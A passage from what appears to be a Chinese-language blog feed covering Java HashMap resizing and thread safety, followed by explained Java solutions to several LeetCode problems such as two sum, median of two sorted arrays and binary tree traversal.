alt="image-20230401223411799"></p></li><li><p>最后进行<code>transfer</code>，即遍历旧的table的所有 Entry，然后重新计算哈希值，放到 newTable中对应的位置。</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401223512130.png" alt="image-20230401223512130"></p></li></ul></li></ol><h2 id="0x09-扩容（jdk8）"><a href="#0x09-扩容（jdk8）" class="headerlink" title="0x09 扩容（jdk8）"></a>0x09 扩容（jdk8）</h2><p>jdk8中的 hashmap 的扩容只需要满足一个条件，当存放的新值（不是替换已有的元素的位置）时已有的元素个数大于阈值（已有元素等于阈值，则下一个存放必然触发扩容机制）</p><p>注： </p><ol><li>扩容一定是放入新值的时候，该新值不是替换以前的位置的情况下。</li><li>扩容发生在存放元素之后，当数据存放之后（先存放，后扩容）， 判断当前存入对象的个数，如果大于阈值则进行扩容</li></ol><p>在jdk8中使用2次幂的扩展（长度扩展为原来的2倍）</p><img src="/image/HashMap-学习.assets/image-20230412122419852.png" alt="image-20230412122419852" style="zoom:30%;" /><p>图（a）表示扩容前的key1和key2两种key确定索引位置的示例</p><p>图（b）表示扩容后key1和key2两种key确定索引位置的示例，其中hash1是key1对应的哈希与高位运算结果。</p><p>元素在重新计算hash之后，因为n变为之前的2倍，那么n-1的mask范围在高位多1bit</p><img src="/image/HashMap-学习.assets/image-20230412122939002.png" alt="image-20230412122939002" style="zoom:33%;" /><p>因此，我们在扩充HashMap的时候，不需要像JDK1.7的实现那样重新计算hash，只需要看看原来的hash值新增的那个bit是1还是0就好了，是0的话索引没变，是1的话索引变成“原索引+oldCap”</p><p>优点：扩容的过程就能把之前哈希冲突的元素再随机的分布到不同的索引</p><img src="/image/HashMap-学习.assets/image-20230412123030860.png" alt="image-20230412123030860" style="zoom:30%;" /><h2 id="0x0a-线程安全性"><a href="#0x0a-线程安全性" class="headerlink" title="0x0a 线程安全性"></a>0x0a 线程安全性</h2><p>在HashMap的源码中不存在任何同步机制，当多个线程并发操作一个HashMap时，会引发线程不安全的问题。</p><p>如果两个线程要<code>put</code>的 key 是不同的，其实也没有线程不安全问题；如果要<code>put</code>的 key 是相同的，那更没有问题了，因为 HashMap 是保证 key 唯一的，后插入的数据直接覆盖前面插入的，不会出现两个一样 key 的数据。</p><p>但是当两个线程操作一个 HashMap，且两个线程都判断出应该 resize 了，其中一个线程已经完成了 resize，并且把 table 更新为新的 newTable，但是另一个线程还处于<code>transfer</code>方法中，最后会导致循环引用的问题。</p><p><strong>参考：</strong></p><p><a href="https://tech.meituan.com/2016/06/24/java-hashmap.html">Java 8系列之重新认识HashMap</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-HashMap-简介&quot;&gt;&lt;a href=&quot;#0x01-HashMap-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 HashMap 简介&quot;&gt;&lt;/a&gt;0x01 HashMap 简介&lt;/h2&gt;&lt;p&gt;&lt;code&gt;java.util.Ha</summary>
      
    
    
    
    
    <category term="Java" scheme="https://banana69.site/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode 热题 HOT 100 - 简单</title>
    <link href="https://banana69.site/2023/03/03/Hot100/"/>
    <id>https://banana69.site/2023/03/03/Hot100/</id>
    <published>2023-03-02T16:00:00.000Z</published>
    <updated>2023-03-03T08:03:52.632Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/">1. 两数之和</a></h3><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,7,11,15], target = 9</span><br><span class="line">输出：[0,1]</span><br><span class="line">解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。</span><br></pre></td></tr></table></figure><p>思路：哈希表</p><p>遍历数组 nums，i 为当前下标，每个值都判断map中是否存在 target-nums[i] 的 key 值如果存在则找到了两个值，如果不存在则将当前的 (nums[i],i) 存入 map 中，继续遍历直到找到为止</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(target - nums[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;map.get(target - nums[i]), i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-无重复字符的最长子串"><a href="#2-无重复字符的最长子串" class="headerlink" title="2. 无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">2. 无重复字符的最长子串</a></h3><p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: s = &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br></pre></td></tr></table></figure><p>考察：滑动窗口算法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>;<span class="comment">//用于记录最大不重复子串的长度</span></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;<span class="comment">//滑动窗口左指针</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length() ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">            1、首先，判断当前字符是否包含在map中，如果不包含，将该字符添加到map（字符，字符在数组下标）,</span></span><br><span class="line"><span class="comment">             此时没有出现重复的字符，左指针不需要变化。此时不重复子串的长度为：i-left+1，与原来的maxLen比较，取最大值；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            2、如果当前字符 ch 包含在 map中，此时有2类情况：</span></span><br><span class="line"><span class="comment">             1）当前字符包含在当前有效的子段中，如：abca，当我们遍历到第二个a，当前有效最长子段是 abc，我们又遍历到a，</span></span><br><span class="line"><span class="comment">             那么此时更新 left 为 map.get(a)+1=1，当前有效子段更新为 bca；</span></span><br><span class="line"><span class="comment">             2）当前字符不包含在当前最长有效子段中，如：abba，我们先添加a,b进map，</span></span><br><span class="line"><span class="comment">               此时left=0，我们再添加b，发现map中包含b，</span></span><br><span class="line"><span class="comment">               而且b包含在最长有效子段中，就是1）的情况，我们更新 left=map.get(b)+1=2，</span></span><br><span class="line"><span class="comment">               此时子段更新为 b，而且map中仍然包含a，map.get(a)=0；</span></span><br><span class="line"><span class="comment">               随后，我们遍历到a，发现a包含在map中，且map.get(a)=0，</span></span><br><span class="line"><span class="comment">               如果我们像1）一样处理，就会发现 left=map.get(a)+1=1，</span></span><br><span class="line"><span class="comment">               实际上，left此时应该不变，left始终为2，子段变成 ba才对。</span></span><br><span class="line"><span class="comment">               </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             为了处理以上2类情况，我们每次更新left，left=Math.max(left , map.get(ch)+1).</span></span><br><span class="line"><span class="comment">             另外，更新left后，不管原来的 s.charAt(i) 是否在最长子段中，我们都要将 s.charAt(i) 的位置更新为当前的i，</span></span><br><span class="line"><span class="comment">             因此此时新的 s.charAt(i) 已经进入到 当前最长的子段中！</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(s.charAt(i)))</span><br><span class="line">            &#123;</span><br><span class="line">                left = Math.max(left , map.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//不管是否更新left，都要更新 s.charAt(i) 的位置！</span></span><br><span class="line">            map.put(s.charAt(i) , i);</span><br><span class="line">            maxLen = Math.max(maxLen , i-left+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3-寻找两个正序数组的中位数"><a href="#3-寻找两个正序数组的中位数" class="headerlink" title="3. 寻找两个正序数组的中位数"></a><a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/">3. 寻找两个正序数组的中位数</a></h3><p>给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。</p><p>算法的时间复杂度应该为 O(log (m+n)) 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,3], nums2 = [2]</span><br><span class="line">输出：2.00000</span><br><span class="line">解释：合并数组 = [1,2,3] ，中位数 2</span><br></pre></td></tr></table></figure><p>思路：二分法查找</p><p>题目是求中位数，其实就是求第 <code>k</code> 小数的一种特殊情况，而求第 <code>k</code> 小数有一种算法。我们一次遍历就相当于去掉不可能是中位数的一个值，也就是一个一个排除。由于数列是有序的，其实我们完全可以一半儿一半儿的排除。假设我们要找第 k 小数，我们可以每次循环排除掉 k/2 个数。</p><p>假设需要寻找第7小的数字</p><p><img src="/image/Hot100.assets/735ea8129ab5b56b7058c6286217fa4bb5f8a198e4c8b2172fe0f75b29a966cd-image.png" alt="image.png"></p><p>比较两个数组的<code>k/2</code>个数字，如果<code>k</code>是奇数，向下取整，也就是比较第 3 个数字，上边数组中的 4 和下边数组中的 3 ，如果哪个小，就表明该数组的前<code>k/2</code>个数字都不是第<code>k</code>小的数字，所以可以排除掉<code>1,2,3</code>这三个数字，将<code>1,3,4,9</code>和<code>4,5,6,7,8,9,10</code>这两个数组做为新的数组进行比较。</p><p>更一般的情况 A[1] ，A[2] ，A[3]，A[k/2] … ，B[1]，B[2]，B[3]，B[k/2] … ，如果 A[k/2]&lt;B[k/2] ，那么A[1]，A[2]，A[3]，A[k/2]都不可能是第 k 小的数字。</p><p>A 数组中比 A[k/2] 小的数有 k/2-1 个，B 数组中，比 B[k/2] 小的数有k/2-1个，假设 B[k/2] 前边的数字都比 A[k/2] 小，也只有 k/2-1 个，所以比 A[k/2] 小的数字最多有 k/2-1 +k/2-1 =k-2个，所以 A[k/2] 最多是第 k-1 小的数。而比 A[k/2] 小的数更不可能是第 k 小的数了，所以可以把它们排除。</p><blockquote><p>橙色的部分表示已经去掉的数字。</p></blockquote><p><img src="/image/Hot100.assets/09b8649cd2b8bbea74f7f632b098fed5f8404530ff44b5a0b54a360b3cf7dd8f-image.png" alt="image.png"></p><p>由于我们已经排除掉了 3 个数字，就是这 3 个数字一定在最前边，所以在两个新数组中，我们只需要找第 7 - 3 = 4 小的数字就可以了，也就是 k = 4。此时两个数组，比较第 2 个数字，3 &lt; 5，所以我们可以把小的那个数组中的 1 ，3 排除掉了。</p><p><img src="/image/Hot100.assets/f2d72fd3dff109ad810895b9a0c8d8782f47df6b2f24f9de72704961bc547fcb-image.png" alt="image.png"></p><p>我们又排除掉 2 个数字，所以现在找第 4 - 2 = 2 小的数字就可以了。此时比较两个数组中的第 k / 2 = 1 个数，4 == 4，怎么办呢？由于两个数相等，所以我们无论去掉哪个数组中的都行，因为去掉 1 个总会保留 1 个的，所以没有影响。为了统一，我们就假设 4 &gt; 4 吧，所以此时将下边的 4 去掉。</p><p><img src="/image/Hot100.assets/3c89a8ea29f2e19057b57242c8bc37c5f09b6796b96c30f3d42caea21c12f294-image.png" alt="image.png"></p><p>由于又去掉 1 个数字，此时我们要找第 1 小的数字，所以只需判断两个数组中第一个数字哪个小就可以了，也就是 4。</p><p>所以第 7 小的数字是 4。</p><p>我们每次都是取 k/2 的数进行比较，有时候可能会遇到数组长度小于 k/2的时候。</p><p><img src="/image/Hot100.assets/ad87d1f63a9bbd99e12605686290800ce61b03f9fb98d87f1d8c020d404421ac-image.png" alt="image.png"></p><p>此时 k / 2 等于 3，而上边的数组长度是 2，我们此时将箭头指向它的末尾就可以了。这样的话，由于 2 &lt; 3，所以就会导致上边的数组 1，2 都被排除。造成下边的情况。</p><p><img src="/image/Hot100.assets/7ea1963f184b1dcaddf951326ccbe7aa09cfbb9ebee7fffb2ede131853b3d1de-image.png" alt="image.png"></p><p>由于 2 个元素被排除，所以此时 k = 5，又由于上边的数组已经空了，我们只需要返回下边的数组的第 5 个数字就可以了。</p><p>从上边可以看到，无论是找第奇数个还是第偶数个数字，对我们的算法并没有影响，而且在算法进行中，k 的值都有可能从奇数变为偶数，最终都会变为 1 或者由于一个数组空了，直接返回结果。</p><p>所以我们采用递归的思路，为了防止数组长度小于 k/2，所以每次比较 min(k/2，len(数组) 对应的数字，把小的那个对应的数组的数字排除，将两个新数组进入递归，并且 k 要减去排除的数字的个数。递归出口就是当 k=1 或者其中一个数字长度是 0 了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums1.length;</span><br><span class="line">        <span class="keyword">int</span> m = nums2.length;</span><br><span class="line">        <span class="comment">//因为数组是从索引0开始的，因此我们在这里必须+1，即索引(k+1)的数，才是第k个数。</span></span><br><span class="line">        <span class="keyword">int</span> left = (n + m + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> right = (n + m + <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="comment">//将偶数和奇数的情况合并，如果是奇数，会求两次同样的 k</span></span><br><span class="line">        <span class="keyword">return</span> (getKth(nums1, <span class="number">0</span>, n - <span class="number">1</span>, nums2, <span class="number">0</span>, m - <span class="number">1</span>, left) + getKth(nums1, <span class="number">0</span>, n - <span class="number">1</span>, nums2, <span class="number">0</span>, m - <span class="number">1</span>, right)) * <span class="number">0.5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getKth</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> start1, <span class="keyword">int</span> end1, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> start2, <span class="keyword">int</span> end2, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//因为索引和算数不同6-0=6，但是是有7个数的，因为end初始就是数组长度-1构成的。</span></span><br><span class="line">        <span class="comment">//最后len代表当前数组(也可能是经过递归排除后的数组)，符合当前条件的元素的个数</span></span><br><span class="line">        <span class="keyword">int</span> len1 = end1 - start1 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> len2 = end2 - start2 + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//让 len1 的长度小于 len2，这样就能保证如果有数组空了，一定是 len1</span></span><br><span class="line">        <span class="comment">//就是如果len1长度小于len2，把getKth()中参数互换位置，即原来的len2就变成了len1，即len1，永远比len2小</span></span><br><span class="line">        <span class="keyword">if</span> (len1 &gt; len2) <span class="keyword">return</span> getKth(nums2, start2, end2, nums1, start1, end1, k);</span><br><span class="line">        <span class="comment">//如果一个数组中没有了元素，那么即从剩余数组nums2的其实start2开始加k再-1.</span></span><br><span class="line">        <span class="comment">//因为k代表个数，而不是索引，那么从nums2后再找k个数，那个就是start2 + k-1索引处就行了。因为还包含nums2[start2]也是一个数。因为它在上次迭代时并没有被排除</span></span><br><span class="line">        <span class="keyword">if</span> (len1 == <span class="number">0</span>) <span class="keyword">return</span> nums2[start2 + k - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果k=1，表明最接近中位数了，即两个数组中start索引处，谁的值小，中位数就是谁(start索引之前表示经过迭代已经被排出的不合格的元素，即数组没被抛弃的逻辑上的范围是nums[start]---&gt;nums[end])。</span></span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">1</span>) <span class="keyword">return</span> Math.min(nums1[start1], nums2[start2]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为了防止数组长度小于 k/2,每次比较都会从当前数组所生长度和k/2作比较，取其中的小的(如果取大的，数组就会越界)</span></span><br><span class="line">        <span class="comment">//然后素组如果len1小于k / 2，表示数组经过下一次遍历就会到末尾，然后后面就会在那个剩余的数组中寻找中位数</span></span><br><span class="line">        <span class="keyword">int</span> i = start1 + Math.min(len1, k / <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> j = start2 + Math.min(len2, k / <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果nums1[i] &gt; nums2[j]，表示nums2数组中包含j索引，之前的元素，逻辑上全部淘汰，即下次从J+1开始。</span></span><br><span class="line">        <span class="comment">//而k则变为k - (j - start2 + 1)，即减去逻辑上排出的元素的个数(要加1，因为索引相减，相对于实际排除的时要少一个的)</span></span><br><span class="line">        <span class="keyword">if</span> (nums1[i] &gt; nums2[j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> getKth(nums1, start1, end1, nums2, j + <span class="number">1</span>, end2, k - (j - start2 + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> getKth(nums1, i + <span class="number">1</span>, end1, nums2, start2, end2, k - (i - start1 + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>方法二：</p><p>不需要将两个数组真的合并，只需要找到中位数的位置：写一个循环，然后里边判断是否到了中位数的位置，到了就返回结果。</p><p><strong>将奇数和偶数的情况合并：</strong></p><p>用 len 表示合并后数组的长度，如果是奇数，我们需要知道第 （len+1）/2 个数就可以了，如果遍历的话需要遍历 int(len/2 ) + 1 次。如果是偶数，我们需要知道第 len/2和 len/2+1 个数，也是需要遍历 len/2+1 次。所以遍历的话，奇数和偶数都是 len/2+1 次。</p><p>返回中位数的话，奇数需要最后一次遍历的结果就可以了，偶数需要最后一次和上一次遍历的结果。所以我们用两个变量 left 和 right，right 保存当前循环的结果，在每次循环前将 right 的值赋给 left。这样在最后一次循环的时候，left 将得到 right 的值，也就是上一次循环的结果，接下来 right 更新为最后一次的结果。</p><p><strong>循环的写法：</strong></p><p>用 aStart 和 bStart 分别表示当前指向 A 数组和 B 数组的位置。如果 aStart 还没有到最后并且此时 A 位置的数字小于 B 位置的数组，那么就可以后移了。也就是aStart＜m&amp;&amp;A[aStart]&lt; B[bStart]。</p><p>但如果 B 数组此刻已经没有数字了，继续取数字 B[ bStart ]，则会越界，所以判断下 bStart 是否大于数组长度了，这样 || 后边的就不会执行了，也就不会导致错误了，所以增加为 aStart＜m&amp;&amp;(bStart) &gt;= n||A[aStart]&lt;B[bStart]) 。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> m = nums1.length;</span><br><span class="line">       <span class="keyword">int</span> n = nums2.length;</span><br><span class="line">       <span class="keyword">int</span> len = m + n;</span><br><span class="line">       <span class="keyword">int</span> left = -<span class="number">1</span>, right = -<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">int</span> aStart = <span class="number">0</span>, bStart = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;= len / <span class="number">2</span>;i++)&#123;</span><br><span class="line">           System.out.printf(<span class="string">&quot;left: %d,right: %d \n&quot;</span>,left,right);</span><br><span class="line">           left = right;</span><br><span class="line">           <span class="keyword">if</span>(aStart &lt; m &amp;&amp; (bStart &gt;= n || nums1[aStart] &lt; nums2[bStart]))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;TRUE&quot;</span>);</span><br><span class="line">               right = nums1[aStart++];</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;ELSE&quot;</span>);</span><br><span class="line">               right = nums2[bStart++];</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>((len &amp; <span class="number">1</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> (left + right) / <span class="number">2.0</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> right;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-爬楼梯"><a href="#4-爬楼梯" class="headerlink" title="4. 爬楼梯"></a><a href="https://leetcode.cn/problems/climbing-stairs/">4. 爬楼梯</a></h3><p> 假设你正在爬楼梯。需要 <code>n</code> 阶你才能到达楼顶。</p><p>每次你可以爬 <code>1</code> 或 <code>2</code> 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：有两种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶</span><br><span class="line">2. 2 阶</span><br></pre></td></tr></table></figure><p>思路：动态规划</p><p>本问题其实常规解法可以分成多个子问题，爬第n阶楼梯的方法数量，等于 2 部分之和</p><p>爬上 n−1 阶楼梯的方法数量。因为再爬1阶就能到第n阶<br>爬上 n−2 阶楼梯的方法数量，因为再爬2阶就能到第n阶</p><p>所以我们得到公式 dp[n]=dp[n−1]+dp[n−2]<br>同时需要初始化 dp[0]=1 和 dp[1]=1<br>时间复杂度：O(n)</p><p><img src="/image/Hot100.assets/70_fig1.gif" alt="fig1"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">2</span>]; <span class="comment">//该数组每个元素的指针对应的是台阶数,元素的值存放的是台阶数对应的方法数</span></span><br><span class="line">        <span class="comment">//dp[0] = 0; //不管怎样,数组下标指针肯定是从0开始的,所以要考虑0.有0个台阶,不需要爬,所以没有方法数(但从斐波那契角度,dp[0]=1)</span></span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>; <span class="comment">//1阶台阶,只有一种方式(1)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2阶台阶,有两种方式(1+1, 2), 因为题目设定n是正整数,所以n最小是1,此时如果定义dp的长度是int[n + 1],则length=2</span></span><br><span class="line">        <span class="comment">//而dp[2]实际对应的是第三个元素,超出length了,所以定义new int[n + 2]更合理</span></span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从第三个台阶开始遍历,第三个台阶,是第二个台阶的方法和第一个台阶的方法之和</span></span><br><span class="line">        <span class="comment">//第四个台阶,是第三个台阶和第二个台阶方法之和,依此论推....</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123; <span class="comment">//要遍历到第n个台阶,所以指针其实是从0到n,所以dp数组数量比n多1</span></span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>]; <span class="comment">//最后到第n个台阶,得到结果后正好遍历完</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="5-二叉树的中序遍历"><a href="#5-二叉树的中序遍历" class="headerlink" title="5.二叉树的中序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-inorder-traversal/">5.二叉树的中序遍历</a></h3><p>给定一个二叉树的根节点 <code>root</code> ，返回 <em>它的 <strong>中序</strong> 遍历</em> 。</p><p><img src="/image/Hot100.assets/inorder_1.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,null,2,3]</span><br><span class="line">输出：[1,3,2]</span><br></pre></td></tr></table></figure><p>递归遍历:</p><p>前序遍历：打印 - 左 - 右<br>中序遍历：左 - 打印 - 右<br>后序遍历：左 - 右 - 打印<br>题目要求的是中序遍历，那就按照 左-打印-右这种顺序遍历树就可以了，递归函数实现</p><p>终止条件：当前节点为空时<br>函数内：递归的调用左节点，打印当前节点，再递归调用右节点</p><p>非递归(迭代)：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt;  stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(stack.size() &gt; <span class="number">0</span> || root != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//不断往左子树的方向走，每走一次就将当前节点保存到栈中</span></span><br><span class="line">            <span class="comment">//模拟递归调用</span></span><br><span class="line">            <span class="keyword">if</span>(root != <span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.add(root);</span><br><span class="line">                root = root.left;</span><br><span class="line">                <span class="comment">//若当前节点为空，则说明左边走到头了，从栈中弹出节点并保存，然后转向右边节点，继续上面的过程</span></span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            TreeNode tmp = stack.pop();</span><br><span class="line">            res.add(tmp.val);</span><br><span class="line">            root = tmp.right;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        inOrder(res,root);        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(List&lt;Integer&gt; res,TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//按照左-打印-右的方式进行遍历</span></span><br><span class="line">        inOrder(res,root.left);</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        inOrder(res,root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-对称二叉树"><a href="#6-对称二叉树" class="headerlink" title="6. 对称二叉树"></a><a href="https://leetcode.cn/problems/symmetric-tree/">6. 对称二叉树</a></h3><p>给你一个二叉树的根节点 <code>root</code> ， 检查它是否轴对称。</p><p><img src="/image/Hot100.assets/symtree1.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,2,2,3,4,4,3]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p>思路：</p><p>注意这句话，左子树和右子相等，也就是说要递归的比较左子树和右子树。<br>我们将根节点的左子树记做 left，右子树记做 right。比较 left 是否等于 right，不等的话直接返回就可以了。<br>如果相当，比较 left 的左节点和 right 的右节点，再比较 left 的右节点和 right 的左节点<br>比如看下面这两个子树(他们分别是根节点的左子树和右子树)，能观察到这么一个规律：<br>左子树 2 的左孩子 == 右子树 2 的右孩子<br>左子树 2 的右孩子 == 右子树 2 的左孩子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  2         2</span><br><span class="line">   / \       / \</span><br><span class="line">  3   4     4   3</span><br><span class="line"> / \ / \   / \ / \</span><br><span class="line">8  7 6  5 5  6 7  